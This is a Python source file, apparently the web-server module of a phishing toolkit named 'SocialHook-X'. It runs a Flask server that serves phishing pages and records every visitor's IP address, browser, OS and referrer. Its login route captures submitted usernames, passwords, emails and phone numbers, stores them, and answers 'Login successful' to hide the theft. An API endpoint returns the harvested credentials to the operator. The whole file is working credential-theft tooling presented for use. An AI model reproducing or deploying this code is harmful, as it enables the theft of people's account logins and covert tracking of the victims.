"""
SocialHook-X Web Server Module
Flask-based credential capture and serving
"""

import logging
import json
from flask import Flask, request, render_template_string, jsonify
from functools import wraps
from typing import Callable

logger = logging.getLogger(__name__)

class WebServer:
    """Flask web server for serving phishing templates"""
    
    def __init__(self, template_dir: str = "templates", port: int = 8080):
        self.app = Flask(__name__, static_folder=None)
        self.app.config['JSON_SORT_KEYS'] = False
        self.template_dir = template_dir
        self.port = port
        self.db = None
        self.credentials_callback = None
        self.visitor_callback = None
        self._setup_routes()
    
    def set_database(self, db):
        """Set database instance for storing credentials"""
        self.db = db
    
    def set_callbacks(self, cred_callback: Callable = None, visitor_callback: Callable = None):
        """Set callbacks for credential and visitor events"""
        self.credentials_callback = cred_callback
        self.visitor_callback = visitor_callback
    
    def _setup_routes(self):
        """Setup Flask routes"""
        
        @self.app.route('/', methods=['GET'])
        def index():
            """Serve index page"""
            try:
                # Track visitor
                self._track_visitor()
                return "Page served", 200
            except Exception as e:
                logger.error(f"Error serving index: {e}")
                return "Error", 500
        
        @self.app.route('/login', methods=['POST'])
        def login():
            """Handle login credentials"""
            try:
                data = request.get_json() or request.form.to_dict()
                
                cred_dict = {
                    'template': request.args.get('template', 'unknown'),
                    'username': data.get('username') or data.get('email') or data.get('login'),
                    'password': data.get('password') or data.get('pass'),
                    'email': data.get('email'),
                    'phone': data.get('phone'),
                    'extra_data': data,
                    'ip_address': self._get_client_ip(),
                    'user_agent': request.headers.get('User-Agent', ''),
                    'browser': self._get_browser(),
                    'os': self._get_os()
                }
                
                # Store credential
                if self.db:
                    cred_id = self.db.add_credential(cred_dict)
                    if self.credentials_callback:
                        self.credentials_callback(cred_dict, cred_id)
                
                logger.info(f"Credential captured: {cred_dict.get('template')}")
                
                return jsonify({'status': 'ok', 'message': 'Login successful'}), 200
            
            except Exception as e:
                logger.error(f"Error processing login: {e}")
                return jsonify({'status': 'error', 'message': str(e)}), 400
        
        @self.app.route('/api/stats', methods=['GET'])
        def get_stats():
            """Get campaign statistics"""
            try:
                if self.db:
                    stats = self.db.get_statistics()
                    return jsonify(stats), 200
                return jsonify({'error': 'Database not available'}), 500
            except Exception as e:
                logger.error(f"Error getting stats: {e}")
                return jsonify({'error': str(e)}), 500
        
        @self.app.route('/api/credentials', methods=['GET'])
        def get_credentials():
            """Get captured credentials (filtered)"""
            try:
                template = request.args.get('template')
                if self.db:
                    creds = self.db.get_credentials(template)
                    return jsonify(creds), 200
                return jsonify({'error': 'Database not available'}), 500
            except Exception as e:
                logger.error(f"Error getting credentials: {e}")
                return jsonify({'error': str(e)}), 500
        
        @self.app.errorhandler(404)
        def not_found(e):
            return jsonify({'error': 'Not found'}), 404
        
        @self.app.errorhandler(500)
        def server_error(e):
            logger.error(f"Server error: {e}")
            return jsonify({'error': 'Internal server error'}), 500
    
    def _track_visitor(self):
        """Track visitor information"""
        try:
            visitor_dict = {
                'template': request.args.get('template', 'unknown'),
                'ip_address': self._get_client_ip(),
                'user_agent': request.headers.get('User-Agent', ''),
                'referrer': request.referrer or 'direct',
                'geo_data': {}
            }
            
            if self.db:
                visitor_id = self.db.add_visitor(visitor_dict)
                if self.visitor_callback:
                    self.visitor_callback(visitor_dict, visitor_id)
        
        except Exception as e:
            logger.error(f"Error tracking visitor: {e}")
    
    def _get_client_ip(self) -> str:
        """Get client IP address"""
        if request.environ.get('HTTP_CF_CONNECTING_IP'):
            return request.environ.get('HTTP_CF_CONNECTING_IP')
        elif request.environ.get('HTTP_X_FORWARDED_FOR'):
            return request.environ.get('HTTP_X_FORWARDED_FOR').split(',')[0].strip()
        return request.remote_addr or 'unknown'
    
    def _get_browser(self) -> str:
        """Extract browser from user agent"""
        ua = request.headers.get('User-Agent', '').lower()
        
        if 'chrome' in ua and 'edg' not in ua:
            return 'Chrome'
        elif 'edge' in ua or 'edg' in ua:
            return 'Edge'
        elif 'firefox' in ua:
            return 'Firefox'
        elif 'safari' in ua and 'chrome' not in ua:
            return 'Safari'
        elif 'opera' in ua:
            return 'Opera'
        elif 'trident' in ua:
            return 'IE'
        else:
            return 'Other'
    
    def _get_os(self) -> str:
        """Extract OS from user agent"""
        ua = request.headers.get('User-Agent', '').lower()
        
        if 'windows' in ua:
            return 'Windows'
        elif 'mac' in ua or 'darwin' in ua:
            return 'macOS'
        elif 'linux' in ua:
            return 'Linux'
        elif 'iphone' in ua or 'ipad' in ua:
            return 'iOS'
        elif 'android' in ua:
            return 'Android'
        else:
            return 'Unknown'
    
    def start(self, debug: bool = False):
        """Start Flask server"""
        try:
            logger.info(f"Starting web server on port {self.port}")
            self.app.run(host='0.0.0.0', port=self.port, debug=debug, use_reloader=False)
        except Exception as e:
            logger.error(f"Error starting web server: {e}")
    
    def stop(self):
        """Stop Flask server"""
        logger.info("Stopping web server")
